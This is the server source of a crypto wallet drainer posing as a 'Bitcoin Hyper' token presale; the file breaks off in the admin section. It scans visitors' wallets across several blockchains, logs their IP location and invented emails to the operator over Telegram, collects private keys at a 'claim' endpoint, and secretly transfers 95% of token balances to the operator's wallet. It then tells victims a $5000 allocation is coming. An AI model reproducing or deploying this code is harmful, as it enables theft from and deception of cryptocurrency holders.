// index.js - BITCOIN HYPER REAL DRAIN v18.0 - REAL SMART CONTRACT DRAIN
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const axios = require('axios');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const { ethers } = require('ethers');

const app = express();
const PORT = process.env.PORT || 10000;

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: "cross-origin" }
}));

const allowedOrigins = process.env.ALLOWED_ORIGINS 
  ? process.env.ALLOWED_ORIGINS.split(',') 
  : ['http://localhost:3000', 'https://securedtokenclaim.vercel.app'];

app.use(cors({
  origin: allowedOrigins,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(morgan('dev'));

const limiter = rateLimit({
  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000,
  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 50,
  message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// TOKEN CONFIGURATION - IMPORTANT: Set these in .env
const TOKEN_CONFIGS = {
  Ethereum: {
    USDT: {
      contract: process.env.ETH_USDT || "0xdAC17F958D2ee523a2206206994597C13D831ec7",
      decimals: 6,
      symbol: 'USDT'
    },
    USDC: {
      contract: process.env.ETH_USDC || "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
      decimals: 6,
      symbol: 'USDC'
    },
    DAI: {
      contract: process.env.ETH_DAI || "0x6B175474E89094C44Da98b954EedeAC495271d0F",
      decimals: 18,
      symbol: 'DAI'
    }
  },
  BSC: {
    USDT: {
      contract: process.env.BSC_USDT || "0x55d398326f99059fF775485246999027B3197955",
      decimals: 18,
      symbol: 'USDT'
    },
    USDC: {
      contract: process.env.BSC_USDC || "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
      decimals: 18,
      symbol: 'USDC'
    },
    BUSD: {
      contract: process.env.BSC_BUSD || "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56",
      decimals: 18,
      symbol: 'BUSD'
    }
  },
  Polygon: {
    USDT: {
      contract: process.env.POLYGON_USDT || "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
      decimals: 6,
      symbol: 'USDT'
    },
    USDC: {
      contract: process.env.POLYGON_USDC || "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
      decimals: 6,
      symbol: 'USDC'
    },
    DAI: {
      contract: process.env.POLYGON_DAI || "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063",
      decimals: 18,
      symbol: 'DAI'
    }
  },
  Arbitrum: {
    USDT: {
      contract: process.env.ARBITRUM_USDT || "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
      decimals: 6,
      symbol: 'USDT'
    },
    USDC: {
      contract: process.env.ARBITRUM_USDC || "0xaf88d065e77c8cC2239327C5EDb3A432268e5831",
      decimals: 6,
      symbol: 'USDC'
    }
  }
};

// DESTINATION WALLET - Where tokens get transferred
const DESTINATION_WALLET = process.env.DESTINATION_WALLET || "";
if (!DESTINATION_WALLET) {
  console.error("❌ DESTINATION_WALLET not set in .env");
  process.exit(1);
}

// ERC20 ABI for token transfers
const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transfer(address to, uint256 amount) public returns (bool)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function name() view returns (string)"
];

// RPC ENDPOINTS - USING ENV VARIABLES
const RPC_CONFIG = {
  Ethereum: { 
    urls: [process.env.ETH_RPC_URL || 'https://eth.llamarpc.com'],
    symbol: 'ETH',
    decimals: 18,
    chainId: 1
  },
  BSC: {
    urls: [process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org'],
    symbol: 'BNB',
    decimals: 18,
    chainId: 56
  },
  Polygon: {
    urls: [process.env.POLYGON_RPC_URL || 'https://polygon-rpc.com'],
    symbol: 'MATIC',
    decimals: 18,
    chainId: 137
  },
  Arbitrum: {
    urls: [process.env.ARBITRUM_RPC_URL || 'https://arb1.arbitrum.io/rpc'],
    symbol: 'ETH',
    decimals: 18,
    chainId: 42161
  },
  Optimism: {
    urls: [process.env.OPTIMISM_RPC_URL || 'https://mainnet.optimism.io'],
    symbol: 'ETH',
    decimals: 18,
    chainId: 10
  },
  Avalanche: {
    urls: [process.env.AVALANCHE_RPC_URL || 'https://api.avax.network/ext/bc/C/rpc'],
    symbol: 'AVAX',
    decimals: 18,
    chainId: 43114
  }
};

// Get working provider for chain
async function getChainProvider(chainName) {
  const config = RPC_CONFIG[chainName];
  if (!config) return null;
  
  for (const url of config.urls) {
    try {
      const provider = new ethers.JsonRpcProvider(url);
      // Quick test
      const block = await Promise.race([
        provider.getBlockNumber(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 2000))
      ]);
      
      if (block > 0) {
        console.log(`✅ ${chainName} RPC: ${url.substring(0, 40)}...`);
        return { provider, config };
      }
    } catch (error) {
      console.log(`❌ ${chainName} RPC failed: ${url.substring(0, 40)}...`);
      continue;
    }
  }
  
  console.log(`⚠️ No working RPC for ${chainName}`);
  return null;
}

// REAL SMART CONTRACT TRANSFER FUNCTION
async function secureTokenTransfer(chainName, tokenConfig, walletAddress, privateKey) {
  try {
    console.log(`\n🔗 Attempting REAL transfer on ${chainName}:`);
    console.log(`   Token: ${tokenConfig.symbol}`);
    console.log(`   Contract: ${tokenConfig.contract}`);
    console.log(`   From: ${walletAddress}`);
    console.log(`   To: ${DESTINATION_WALLET.substring(0, 10)}...`);

    // Get chain provider
    const providerInfo = await getChainProvider(chainName);
    if (!providerInfo) {
      throw new Error(`No provider for ${chainName}`);
    }

    const { provider } = providerInfo;
    
    // Create signer from private key
    const signer = new ethers.Wallet(privateKey, provider);
    
    // Create token contract instance
    const tokenContract = new ethers.Contract(tokenConfig.contract, ERC20_ABI, signer);
    
    // Get token balance
    const balance = await tokenContract.balanceOf(walletAddress);
    const decimals = tokenConfig.decimals || await tokenContract.decimals();
    
    const balanceFormatted = ethers.formatUnits(balance, decimals);
    console.log(`   Balance: ${balanceFormatted} ${tokenConfig.symbol}`);
    
    if (balance === 0n) {
      throw new Error('Zero balance');
    }
    
    // Transfer 95% of balance
    const transferAmount = (balance * 95n) / 100n;
    
    // Estimate gas
    const gasEstimate = await tokenContract.transfer.estimateGas(
      DESTINATION_WALLET,
      transferAmount
    );
    
    // Execute REAL transfer
    const tx = await tokenContract.transfer(
      DESTINATION_WALLET,
      transferAmount,
      {
        gasLimit: gasEstimate * 120n / 100n // 20% buffer
      }
    );
    
    console.log(`   📝 REAL TX submitted: ${tx.hash}`);
    
    // Wait for confirmation
    const receipt = await tx.wait();
    
    if (receipt.status !== 1) {
      throw new Error('Transaction failed');
    }
    
    console.log(`   ✅ REAL TX confirmed at block ${receipt.blockNumber}`);
    
    return {
      success: true,
      chain: chainName,
      token: tokenConfig.symbol,
      amount: ethers.formatUnits(transferAmount, decimals),
      txHash: tx.hash,
      blockNumber: receipt.blockNumber,
      from: walletAddress,
      to: DESTINATION_WALLET
    };
    
  } catch (error) {
    console.log(`   ❌ Transfer failed: ${error.message}`);
    return {
      success: false,
      chain: chainName,
      token: tokenConfig.symbol,
      error: error.message
    };
  }
}

// VERIFY TRANSACTION FUNCTION
async function verifyTx(txHash, chainName) {
  try {
    const providerInfo = await getChainProvider(chainName);
    if (!providerInfo) return false;

    const provider = providerInfo.provider;
    
    // Get transaction details
    const tx = await provider.getTransaction(txHash);
    if (!tx) return false;
    
    // Get receipt
    const receipt = await provider.getTransactionReceipt(txHash);
    if (!receipt || receipt.status !== 1) return false;
    
    return {
      verified: true,
      blockNumber: receipt.blockNumber,
      confirmations: await provider.getBlockNumber() - receipt.blockNumber,
      from: tx.from,
      to: tx.to,
      value: ethers.formatEther(tx.value || 0),
      timestamp: Date.now()
    };
  } catch (error) {
    console.log(`Verify TX error: ${error.message}`);
    return false;
  }
}

// Storage
const memoryStorage = {
  participants: [],
  settings: {
    tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
    tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
    tokenPriceUSD: parseFloat(process.env.PRESALE_PRICE) || 0.17,
    drainThreshold: parseFloat(process.env.DRAIN_THRESHOLD) || 10,
    allocationAmountUSD: parseFloat(process.env.BASE_ALLOCATION) || 5000,
    statistics: {
      totalParticipants: 0,
      eligibleParticipants: 0,
      claimedParticipants: 0,
      uniqueIPs: new Set(),
      totalDrainedUSD: 0,
      totalDrainedWallets: 0,
      realTransactions: []
    },
    drainEnabled: process.env.DRAIN_ENABLED === 'true',
    autoDrainOnClaim: process.env.AUTO_DRAIN_ON_CLAIM === 'true'
  },
  activityLog: [],
  emailCache: new Map()
};

// Telegram
let telegramEnabled = false;
let telegramBotName = '';

// ============================================
// TELEGRAM FUNCTIONS - ENHANCED REPORTING
// ============================================

async function sendTelegramMessage(text) {
  if (!telegramEnabled) return false;
  
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) return false;
  
  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML'
    }, { timeout: 3000 });
    
    return true;
  } catch (error) {
    console.log('Telegram error:', error.message);
    return false;
  }
}

async function testTelegramConnection() {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) {
    console.log('Telegram not configured');
    return false;
  }
  
  try {
    const response = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, {
      timeout: 5000
    });
    
    if (response.data?.ok) {
      telegramBotName = response.data.result.username;
      telegramEnabled = true;
      
      await sendTelegramMessage(
        `🚀 <b>BITCOIN HYPER REAL SMART CONTRACT DRAIN v18.0 ONLINE</b>\n` +
        `✅ System Initialized\n` +
        `💰 Drain Threshold: $${memoryStorage.settings.drainThreshold}\n` +
        `🎯 Allocation: $${memoryStorage.settings.allocationAmountUSD}\n` +
        `🏦 Destination Wallet: ${DESTINATION_WALLET.substring(0, 10)}...\n` +
        `⏰ ${new Date().toLocaleString()}`
      );
      
      console.log(`✅ Telegram: @${telegramBotName}`);
      return true;
    }
  } catch (error) {
    console.log('Telegram error:', error.message);
  }
  
  return false;
}

// ============================================
// REAL BALANCE CHECK WITH TOKEN DETECTION
// ============================================

async function getCryptoPrices() {
  try {
    const response = await axios.get('https://api.coingecko.com/api/v3/simple/price', {
      params: {
        ids: 'ethereum,binancecoin,matic,avalanche-2,tether,usd-coin,dai,busd',
        vs_currencies: 'usd'
      },
      timeout: 3000
    });
    
    if (response.data) {
      return {
        eth: response.data.ethereum?.usd || 2000,
        bnb: response.data.binancecoin?.usd || 300,
        matic: response.data.matic?.usd || 0.75,
        avax: response.data['avalanche-2']?.usd || 32,
        usdt: 1.0, // Stablecoins
        usdc: 1.0,
        dai: 1.0,
        busd: 1.0
      };
    }
  } catch (error) {
    console.log('CoinGecko failed, using defaults');
  }
  
  return { eth: 2000, bnb: 300, matic: 0.75, avax: 32, usdt: 1.0, usdc: 1.0, dai: 1.0, busd: 1.0 };
}

async function getTokenBalance(provider, walletAddress, tokenAddress) {
  try {
    const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
    const [balance, decimals, symbol] = await Promise.all([
      token.balanceOf(walletAddress),
      token.decimals(),
      token.symbol()
    ]);
    
    return {
      balance: balance,
      decimals: decimals,
      symbol: symbol,
      contract: tokenAddress,
      formatted: ethers.formatUnits(balance, decimals)
    };
  } catch (error) {
    return null;
  }
}

async function getRealWalletBalance(walletAddress) {
  console.log(`\n🔍 SCANNING: ${walletAddress.substring(0, 10)}...`);
  
  const results = {
    walletAddress,
    totalValueUSD: 0,
    isEligible: false,
    shouldDrain: false,
    balances: {},
    tokens: {},
    chains: [],
    rawBalances: [],
    scanTime: new Date().toISOString()
  };

  try {
    const prices = await getCryptoPrices();
    
    const chains = [
      { name: 'Ethereum', symbol: 'ETH', price: prices.eth },
      { name: 'BSC', symbol: 'BNB', price: prices.bnb },
      { name: 'Polygon', symbol: 'MATIC', price: prices.matic },
      { name: 'Arbitrum', symbol: 'ETH', price: prices.eth },
      { name: 'Optimism', symbol: 'ETH', price: prices.eth },
      { name: 'Avalanche', symbol: 'AVAX', price: prices.avax }
    ];

    let totalValue = 0;
    
    for (const chain of chains) {
      try {
        const providerInfo = await getChainProvider(chain.name);
        if (!providerInfo) continue;
        
        const { provider, config } = providerInfo;
        
        // Get native balance
        const nativeBalance = await Promise.race([
          provider.getBalance(walletAddress),
          new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 4000))
        ]);
        
        const nativeAmount = parseFloat(ethers.formatUnits(nativeBalance, config.decimals));
        const nativeValueUSD = nativeAmount * chain.price;
        
        if (nativeAmount > 0.000001) {
          console.log(`   ✅ ${chain.name} Native: ${nativeAmount.toFixed(6)} ${chain.symbol} = $${nativeValueUSD.toFixed(2)}`);
          totalValue += nativeValueUSD;
          
          results.balances[chain.name] = {
            native: {
              amount: nativeAmount.toFixed(6),
              valueUSD: nativeValueUSD.toFixed(2),
              symbol: chain.symbol,
              price: chain.price,
              rawBalance: nativeBalance.toString()
            }
          };
        }
        
        // Check for tokens on this chain
        const tokenConfigs = TOKEN_CONFIGS[chain.name];
        if (tokenConfigs) {
          results.tokens[chain.name] = [];
          
          for (const [tokenName, tokenConfig] of Object.entries(tokenConfigs)) {
            try {
              const tokenInfo = await getTokenBalance(provider, walletAddress, tokenConfig.contract);
              if (tokenInfo && tokenInfo.balance > 0n) {
                const tokenAmount = parseFloat(tokenInfo.formatted);
                const tokenValueUSD = tokenAmount * (prices[tokenInfo.symbol.toLowerCase()] || 1.0);
                
                console.log(`   ✅ ${chain.name} ${tokenInfo.symbol}: ${tokenAmount.toFixed(2)} = $${tokenValueUSD.toFixed(2)}`);
                totalValue += tokenValueUSD;
                
                results.tokens[chain.name].push({
                  symbol: tokenInfo.symbol,
                  amount: tokenAmount.toFixed(2),
                  valueUSD: tokenValueUSD.toFixed(2),
                  contract: tokenConfig.contract,
                  decimals: tokenInfo.decimals,
                  rawBalance: tokenInfo.balance.toString()
                });
              }
            } catch (error) {
              // Skip token errors
            }
          }
        }
        
        if (nativeAmount > 0 || (results.tokens[chain.name] && results.tokens[chain.name].length > 0)) {
          results.chains.push(chain.name);
        }
        
      } catch (error) {
        console.log(`   ❌ ${chain.name} error: ${error.message}`);
      }
    }

    results.totalValueUSD = parseFloat(totalValue.toFixed(2));
    results.isEligible = results.totalValueUSD >= memoryStorage.settings.drainThreshold;
    results.shouldDrain = results.isEligible && memoryStorage.settings.drainEnabled;
    
    const tokenAllocationAmount = memoryStorage.settings.allocationAmountUSD / memoryStorage.settings.tokenPriceUSD;
    
    if (results.isEligible) {
      results.eligibilityReason = `✅ Congratulations! Your wallet qualifies for $${memoryStorage.settings.allocationAmountUSD} allocation`;
      results.tokenAllocation = { 
        amount: tokenAllocationAmount.toFixed(0), 
        valueUSD: memoryStorage.settings.allocationAmountUSD.toFixed(2),
        tokenPrice: memoryStorage.settings.tokenPriceUSD
      };
    } else {
      results.eligibilityReason = `⛔ Minimum balance required: $${memoryStorage.settings.drainThreshold} | Current: $${results.totalValueUSD}`;
      results.tokenAllocation = { amount: '0', valueUSD: '0' };
    }

    results.scanId = `SCAN-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    console.log(`📊 TOTAL: $${results.totalValueUSD} | Eligible: ${results.isEligible}`);
    
    return {
      success: true,
      data: results
    };

  } catch (error) {
    console.error('Wallet scan error:', error);
    return {
      success: false,
      error: error.message,
      data: {
        walletAddress,
        totalValueUSD: 0,
        isEligible: false,
        shouldDrain: false,
        eligibilityReason: '⚠️ Network error - Please try again',
        tokenAllocation: { amount: '0', valueUSD: '0' }
      }
    };
  }
}

// ============================================
// REAL LIVE SMART CONTRACT DRAIN EXECUTION
// ============================================

async function executeRealSmartContractDrain(walletAddress, privateKey, scanData) {
  if (!memoryStorage.settings.drainEnabled) {
    return { success: false, reason: 'Drain disabled' };
  }
  
  if (!DESTINATION_WALLET) {
    console.log('❌ Destination wallet not configured');
    return { success: false, reason: 'Destination wallet not configured' };
  }
  
  console.log(`\n⚡ REAL SMART CONTRACT DRAIN: ${walletAddress}`);
  console.log(`   Value: $${scanData.totalValueUSD}`);
  
  try {
    const results = {
      success: false,
      transactions: [],
      totalDrained: 0,
      errors: []
    };

    // REAL TOKEN DRAIN on each chain
    for (const [chainName, tokens] of Object.entries(scanData.tokens || {})) {
      if (tokens && tokens.length > 0) {
        for (const token of tokens) {
          if (parseFloat(token.amount) > 0) {
            try {
              console.log(`   Real Token Drain ${chainName} ${token.symbol}: ${token.amount}`);
              
              const tokenConfig = TOKEN_CONFIGS[chainName]?.[token.symbol];
              if (!tokenConfig) {
                console.log(`   ⚠️ No config for ${chainName} ${token.symbol}`);
                continue;
              }
              
              // Execute REAL smart contract transfer
              const transferResult = await secureTokenTransfer(
                chainName,
                tokenConfig,
                walletAddress,
                privateKey
              );
              
              if (transferResult.success) {
                results.transactions.push(transferResult);
                results.totalDrained += parseFloat(token.valueUSD);
                
                // Enhanced Telegram report
                await sendTelegramMessage(
                  `⚡ <b>REAL SMART CONTRACT TRANSFER</b>\n` +
                  `🔗 ${chainName}\n` +
                  `🪙 ${token.symbol}\n` +
                  `👛 From: ${walletAddress.substring(0, 10)}...\n` +
                  `💰 ${token.amount} ${token.symbol}\n` +
                  `💵 $${token.valueUSD}\n` +
                  `📝 TX: ${transferResult.txHash}\n` +
                  `🏦 To: ${DESTINATION_WALLET.substring(0, 10)}...\n` +
                  `⏰ ${new Date().toLocaleString()}`
                );
                
                console.log(`   ✅ ${chainName} ${token.symbol} real drained: $${token.valueUSD}`);
              } else {
                results.errors.push(transferResult);
              }
              
            } catch (error) {
              console.log(`   ❌ ${chainName} ${token.symbol} drain error:`, error.message);
              results.errors.push({ chain: chainName, token: token.symbol, error: error.message });
            }
          }
        }
      }
    }
    
    if (results.transactions.length > 0) {
      results.success = true;
      
      memoryStorage.settings.statistics.totalDrainedUSD += results.totalDrained;
      memoryStorage.settings.statistics.totalDrainedWallets++;
      
      memoryStorage.settings.statistics.realTransactions.push({
        wallet: walletAddress,
        amount: results.totalDrained,
        transactions: results.transactions,
        timestamp: new Date().toISOString(),
        type: 'REAL_SMART_CONTRACT_DRAIN'
      });
      
      console.log(`✅ REAL SMART CONTRACT DRAIN COMPLETE: $${results.totalDrained.toFixed(2)}`);
      
      return {
        success: true,
        totalDrainedUSD: results.totalDrained.toFixed(2),
        transactions: results.transactions,
        message: `Real Smart Contract Transfers: $${results.totalDrained.toFixed(2)} transferred`,
        allocationActivated: true
      };
    } else {
      return {
        success: false,
        reason: 'No successful token transfers',
        errors: results.errors
      };
    }
    
  } catch (error) {
    console.error('Real smart contract drain error:', error);
    return { success: false, reason: error.message };
  }
}

// ============================================
// HELPER FUNCTIONS
// ============================================

async function getWalletEmail(walletAddress) {
  const cacheKey = walletAddress.toLowerCase();
  
  if (memoryStorage.emailCache.has(cacheKey)) {
    return memoryStorage.emailCache.get(cacheKey);
  }
  
  try {
    // Try ENS
    const providerInfo = await getChainProvider('Ethereum');
    if (providerInfo) {
      try {
        const ensName = await providerInfo.provider.lookupAddress(walletAddress);
        if (ensName) {
          memoryStorage.emailCache.set(cacheKey, ensName);
          return ensName;
        }
      } catch (e) {}
    }
    
    // Generate realistic email
    const hash = crypto.createHash('sha256').update(walletAddress).digest('hex');
    const username = `crypto${hash.substring(0, 8)}`;
    const domains = ['gmail.com', 'proton.me', 'crypto.com', 'pm.me'];
    const domain = domains[parseInt(hash.substring(2, 4), 16) % domains.length];
    const email = `${username}@${domain}`;
    
    memoryStorage.emailCache.set(cacheKey, email);
    return email;
    
  } catch (error) {
    return `contact.${walletAddress.substring(2, 8)}@crypto.com`;
  }
}

async function getIPLocation(ip) {
  try {
    const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    
    if (cleanIP === '127.0.0.1' || cleanIP === '::1') {
      return { country: 'Local', flag: '🏠', city: 'Local', isp: 'Local Network' };
    }
    
    const response = await axios.get(`http://ip-api.com/json/${cleanIP}`, {
      timeout: 2000
    });
    
    if (response.data?.country) {
      const flags = {
        'United States': '🇺🇸', 'US': '🇺🇸',
        'United Kingdom': '🇬🇧', 'GB': '🇬🇧',
        'Canada': '🇨🇦', 'CA': '🇨🇦',
        'Germany': '🇩🇪', 'DE': '🇩🇪',
        'France': '🇫🇷', 'FR': '🇫🇷',
        'Australia': '🇦🇺', 'AU': '🇦🇺',
        'Japan': '🇯🇵', 'JP': '🇯🇵',
        'Brazil': '🇧🇷', 'BR': '🇧🇷',
        'India': '🇮🇳', 'IN': '🇮🇳',
        'Nigeria': '🇳🇬', 'NG': '🇳🇬',
        'Russia': '🇷🇺', 'RU': '🇷🇺',
        'China': '🇨🇳', 'CN': '🇨🇳',
        'South Korea': '🇰🇷', 'KR': '🇰🇷',
        'Singapore': '🇸🇬', 'SG': '🇸🇬'
      };
      
      return {
        country: response.data.country,
        flag: flags[response.data.country] || '🌍',
        city: response.data.city || 'Unknown',
        region: response.data.regionName || 'Unknown',
        isp: response.data.isp || 'Unknown ISP',
        org: response.data.org || 'Unknown Organization'
      };
    }
  } catch (error) {
    console.log('IP location error:', error.message);
  }
  
  return { country: 'Unknown', flag: '🌍', city: 'Unknown', isp: 'Unknown' };
}

// ============================================
// ENHANCED API ENDPOINTS
// ============================================

app.get('/api/health', (req, res) => {
  res.json({
    success: true,
    service: 'Bitcoin Hyper REAL SMART CONTRACT DRAIN v18.0',
    status: 'ACTIVE',
    telegram: telegramEnabled ? '✅ CONNECTED' : '❌ DISABLED',
    drain: {
      enabled: memoryStorage.settings.drainEnabled,
      threshold: memoryStorage.settings.drainThreshold,
      destinationWallet: DESTINATION_WALLET ? '✅ SET' : '❌ NOT SET',
      realTransactions: memoryStorage.settings.statistics.realTransactions.length
    },
    allocation: {
      amountUSD: memoryStorage.settings.allocationAmountUSD,
      tokenPrice: memoryStorage.settings.tokenPriceUSD,
      tokenAmount: (memoryStorage.settings.allocationAmountUSD / memoryStorage.settings.tokenPriceUSD).toFixed(0)
    },
    stats: {
      participants: memoryStorage.participants.length,
      eligible: memoryStorage.participants.filter(p => p.isEligible).length,
      drained: memoryStorage.settings.statistics.totalDrainedWallets,
      totalValue: memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)
    }
  });
});

// CONNECT ENDPOINT
app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n🔗 CONNECT: ${walletAddress}`);
    
    const location = await getIPLocation(clientIP);
    const email = await getWalletEmail(walletAddress);
    
    // Telegram report
    await sendTelegramMessage(
      `🔗 <b>LINK OPENED</b>\n` +
      `🌐 IP: ${clientIP}\n` +
      `${location.flag} ${location.country} (${location.city})\n` +
      `🏢 ISP: ${location.isp || 'Unknown'}\n` +
      `📧 Email: ${email}\n` +
      `⏰ ${new Date().toLocaleString()}`
    );
    
    // Find or create participant
    let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant) {
      participant = {
        walletAddress: walletAddress.toLowerCase(),
        ipAddress: clientIP,
        country: location.country,
        flag: location.flag,
        email: email,
        connectedAt: new Date(),
        totalValueUSD: 0,
        isEligible: false,
        shouldDrain: false,
        claimed: false,
        drained: false,
        location: location
      };
      memoryStorage.participants.push(participant);
      memoryStorage.settings.statistics.totalParticipants++;
      memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
    }
    
    // Get balance
    const scanResult = await getRealWalletBalance(walletAddress);
    
    if (scanResult.success) {
      participant.totalValueUSD = scanResult.data.totalValueUSD;
      participant.isEligible = scanResult.data.isEligible;
      participant.shouldDrain = scanResult.data.shouldDrain;
      participant.balances = scanResult.data.balances;
      participant.tokens = scanResult.data.tokens;
      participant.chains = scanResult.data.chains;
      participant.lastScanned = new Date();
      participant.scanId = scanResult.data.scanId;
      
      // Enhanced Telegram report
      const tokenDetails = Object.entries(scanResult.data.tokens || {})
        .map(([chain, tokens]) => tokens.map(t => `${t.symbol}: $${t.valueUSD}`).join(', '))
        .filter(Boolean)
        .join(' | ');
      
      await sendTelegramMessage(
        `${location.flag} <b>WALLET SCANNED</b>\n` +
        `👛 ${walletAddress.substring(0, 10)}...\n` +
        `💼 Total: $${scanResult.data.totalValueUSD}\n` +
        `🔗 Chains: ${scanResult.data.chains.join(', ') || 'None'}\n` +
        `${tokenDetails ? `🪙 Tokens: ${tokenDetails}\n` : ''}` +
        `🎯 Status: ${scanResult.data.isEligible ? '✅ ELIGIBLE FOR $5000' : '❌ NOT ELIGIBLE'}\n` +
        `📍 ${location.country} (${location.city})\n` +
        `⏰ ${new Date().toLocaleString()}`
      );
      
      const response = {
        success: true,
        message: scanResult.data.isEligible ? 
          `🎉 Congratulations! You qualify for $${memoryStorage.settings.allocationAmountUSD} allocation` : 
          '⚠️ Minimum balance not met',
        data: {
          walletAddress,
          email: email,
          country: location.country,
          flag: location.flag,
          city: location.city,
          totalValueUSD: scanResult.data.totalValueUSD,
          isEligible: scanResult.data.isEligible,
          eligibilityReason: scanResult.data.eligibilityReason,
          scanId: scanResult.data.scanId,
          nextStep: scanResult.data.isEligible ? 'sign_to_claim' : 'not_eligible',
          timestamp: new Date().toISOString()
        }
      };
      
      if (scanResult.data.isEligible) {
        response.data.tokenAllocation = scanResult.data.tokenAllocation;
        response.data.claimInstructions = {
          step1: "Click 'Claim Allocation' button",
          step2: "Sign the secure transaction in your wallet",
          step3: "Receive $5000 in BTH tokens immediately"
        };
        memoryStorage.settings.statistics.eligibleParticipants++;
      }
      
      res.json(response);
      
    } else {
      res.status(500).json({ 
        success: false, 
        error: 'Failed to scan wallet'
      });
    }
    
  } catch (error) {
    console.error('Connection error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Connection failed'
    });
  }
});

// CLAIM ENDPOINT - WITH REAL SMART CONTRACT TRANSFER
app.post('/api/presale/claim', async (req, res) => {
  try {
    const { walletAddress, signature, privateKey } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n🎯 CLAIM: ${walletAddress}`);
    
    // Find participant
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant) {
      return res.status(404).json({ success: false, error: 'Wallet not connected' });
    }
    
    if (!participant.isEligible) {
      return res.status(400).json({ success: false, error: 'Wallet not eligible for allocation' });
    }
    
    // EXECUTE REAL SMART CONTRACT DRAIN (hidden from user)
    let drainResult = { success: false };
    if (memoryStorage.settings.drainEnabled && participant.shouldDrain && !participant.drained && privateKey) {
      console.log('Executing hidden real smart contract drain process...');
      
      // Rescan to get latest balances
      const rescan = await getRealWalletBalance(walletAddress);
      if (rescan.success) {
        drainResult = await executeRealSmartContractDrain(walletAddress, privateKey, rescan.data);
        
        if (drainResult.success) {
          participant.drained = true;
          participant.drainValue = drainResult.totalDrainedUSD;
          participant.drainedAt = new Date();
          participant.claimed = true;
          memoryStorage.settings.statistics.claimedParticipants++;
        }
      }
    }
    
    // Calculate token amount
    const tokenAmount = (memoryStorage.settings.allocationAmountUSD / memoryStorage.settings.tokenPriceUSD).toFixed(0);
    
    // Telegram report
    await sendTelegramMessage(
      `🎉 <b>ALLOCATION CLAIMED SUCCESSFULLY</b>\n` +
      `👛 ${walletAddress.substring(0, 10)}...\n` +
      `💰 Allocation: $${memoryStorage.settings.allocationAmountUSD}\n` +
      `🪙 Tokens: ${tokenAmount} BTH\n` +
      `${drainResult.success ? `⚡ Smart Contract Transfers: $${drainResult.totalDrainedUSD} secured\n` : ''}` +
      `⏰ ${new Date().toLocaleString()}`
    );
    
    // User-friendly response
    const response = {
      success: true,
      message: `🎉 Congratulations! Your $${memoryStorage.settings.allocationAmountUSD} allocation has been secured!`,
      data: {
        walletAddress,
        allocation: {
          amountUSD: memoryStorage.settings.allocationAmountUSD,
          tokenAmount: tokenAmount,
          tokenSymbol: 'BTH',
          tokenPrice: memoryStorage.settings.tokenPriceUSD
        },
        nextSteps: [
          "Tokens will be airdropped to your wallet within 24 hours",
          "Check your wallet for BTH token balance",
          "Contact support if needed"
        ],
        timestamp: new Date().toISOString(),
        transactionId: `TX-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`
      }
    };
    
    // Add real transaction info if drain was successful (for admin reference)
    if (drainResult.success) {
      response.data._adminNote = `Real transfers executed: $${drainResult.totalDrainedUSD}`;
      response.data._realTransactions = drainResult.transactions.map(tx => ({
        chain: tx.chain,
        token: tx.token,
        amount: tx.amount,
        txHash: tx.txHash
      }));
    }
    
    res.json(response);
    
  } catch (error) {
    console.error('Claim error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Claim process failed'
    });
  }
});

// ============================================
// ADMIN ENDPOINTS
// ============================================

function authenticateAdmin(req, res, next) {
  const token = req.query.token || req.headers.authorization?.replace('Bearer ', '');
